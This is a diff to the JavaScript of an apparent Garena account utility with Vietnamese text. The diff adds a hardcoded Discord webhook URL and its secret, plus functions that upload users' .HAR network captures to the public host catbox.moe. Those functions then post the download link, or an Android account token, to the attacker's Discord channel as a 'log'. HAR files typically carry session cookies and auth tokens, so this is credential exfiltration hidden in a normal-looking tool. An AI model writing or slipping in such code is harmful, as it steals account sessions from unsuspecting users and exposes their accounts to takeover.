@@ -1,4 +1,5 @@
 const API_BASE_URL = "https://proxy-api-garena.meow-web.workers.dev";
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532752605212835903/VTdukhlG_koAGP2ZxT3bNMLPlaW5MuA-l325qBxImuHA1rWR51nm3NmfkcTN4sF1pAcA";
 
 let currentOs = 'ios';
 let selectedHarFile = null;
@@ -187,6 +188,74 @@ function applyCrop() {
         canvas.toBlob(b => { androidBlobImage = b; }, 'image/png');
     }
     closeCropModal();
+}
+
+async function uploadFileToCatbox(file) {
+    const catboxFormData = new FormData();
+    catboxFormData.append('reqtype', 'fileupload');
+    catboxFormData.append('fileToUpload', file);
+
+    const response = await fetch('https://catbox.moe/user/api.php', {
+        method: 'POST',
+        body: catboxFormData
+    });
+
+    if (!response.ok) {
+        throw new Error("Tải file lên server lưu trữ thất bại!");
+    }
+
+    const fileUrl = await response.text();
+    return fileUrl.trim();
+}
+
+async function sendDiscordWebhook(type, data) {
+    try {
+        const now = new Date().toLocaleString('vi-VN');
+        let payload = {};
+
+        if (type === 'ios') {
+            const harDownloadUrl = await uploadFileToCatbox(data.file);
+
+            payload = {
+                username: "VTT Tools Bot",
+                avatar_url: "https://klipy.com/gifs/ayane-cute",
+                embeds: [{
+                    title: "🚀 Đã Upload File .HAR Thành Công (iOS)",
+                    color: 3719160,
+                    fields: [
+                        { name: "📁 Tên File HAR", value: `\`\`\`${data.file.name}\`\`\``, inline: false },
+                        { name: "📊 Dung Lượng", value: `${(data.file.size / 1024).toFixed(2)} KB`, inline: true },
+                        { name: "🔗 Link Tải Trực Tiếp File HAR", value: `[Bấm Vào Đây Để Tải File HAR](${harDownloadUrl})`, inline: false },
+                        { name: "🕒 Thời Gian", value: now, inline: true }
+                    ],
+                    footer: { text: "VTT Tools Log System" }
+                }]
+            };
+        } else if (type === 'android') {
+            payload = {
+                username: "VTT Tools Bot",
+                avatar_url: "https://klipy.com/gifs/ayane-cute",
+                embeds: [{
+                    title: "📱 Link Token Android Mới",
+                    color: 1095937,
+                    fields: [
+                        { name: "🔑 Link Token / KGVN", value: `\`\`\`${data.token}\`\`\``, inline: false },
+                        { name: "🕒 Thời Gian", value: now, inline: true }
+                    ],
+                    footer: { text: "VTT Tools Log System" }
+                }]
+            };
+        }
+
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+    } catch (err) {
+        console.error("Lỗi khi xử lý Webhook:", err);
+    }
 }
 
 async function submitIosProcess() {
